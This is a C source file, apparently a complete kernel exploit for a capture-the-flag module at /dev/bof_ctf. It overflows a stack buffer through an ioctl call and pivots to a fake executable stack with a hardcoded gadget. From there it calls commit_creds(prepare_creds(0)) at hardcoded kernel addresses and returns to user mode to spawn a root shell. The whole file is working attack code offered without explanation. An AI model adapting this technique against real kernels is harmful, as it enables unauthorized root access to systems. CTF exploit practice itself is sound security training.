#include<stdio.h>
#include<stdlib.h>
#include <sys/ioctl.h>  /* ioctl */
#include<fcntl.h>
#include <sys/mman.h>

#define BOF_OFFSET		28
#define IOCTL_VULN 		1337
#define GADGET			0xffffffff81063d4d
#define FAKE_STACK_ADDR	0x1400000

void shell();
void pe();
void kernel_exploit();
static void save_state();
static void ret2user();
int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_creds)(unsigned long cred);

unsigned long cs;
unsigned long ss;
unsigned long sp;
unsigned long flags;


static void save_state() 
{
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(cs), "=r"(ss), "=r"(sp), "=r"(flags)
      :
      : "memory");
}

static void ret2user() 
{
  asm volatile(
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iretq"
      :
      : "r"(ss), "r"((unsigned long)sp), "r"(flags), "r"(cs), "r"(shell));
}

void shell()
{
	puts("[+]	ROOT\n");
	system("/bin/sh");
}

void pe()
{
	commit_creds(prepare_creds(0));
}

void kernel_exploit()
{
	commit_creds = (void*)0xffffffff81075200;		// from /proc/kallsyms
	prepare_creds = (void*)0xffffffff81075560;		// from /proc/kallsyms
	pe();
	ret2user();
}


int main()
{
	int fd = -1;

	puts("[*]	Start exploiting kernel module\n\n");

	fd = open("/dev/bof_ctf", O_RDWR);
	if (fd < 0)
	{
		puts("[-]	Can't open /dev/bof_ctf device file\n");
		exit(1);
	}
	puts("[+]	Successfully opened /dev/bof_ctf device file\n");

	char *fake_stack = mmap((char*)FAKE_STACK_ADDR, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
	if (fake_stack != (char*)FAKE_STACK_ADDR)
	{
		puts("[-]	Can't mmap fake stack\n");
		exit(1);
	}
	puts("[+]	Successfully mmap fake stack\n");
	*(unsigned long*)(fake_stack + 0x28dd2) = (unsigned long)kernel_exploit;

	char payload[100] = {0};
	for(int i = 0; i < BOF_OFFSET; ++i)
	{
		payload[i] = 'A';
	}
	*(unsigned long*)(payload + BOF_OFFSET) = (unsigned long)GADGET;

	save_state();
	puts("[*]	Jumping to kernel space\n");
	ioctl(fd, IOCTL_VULN, payload);


	return 0;
}
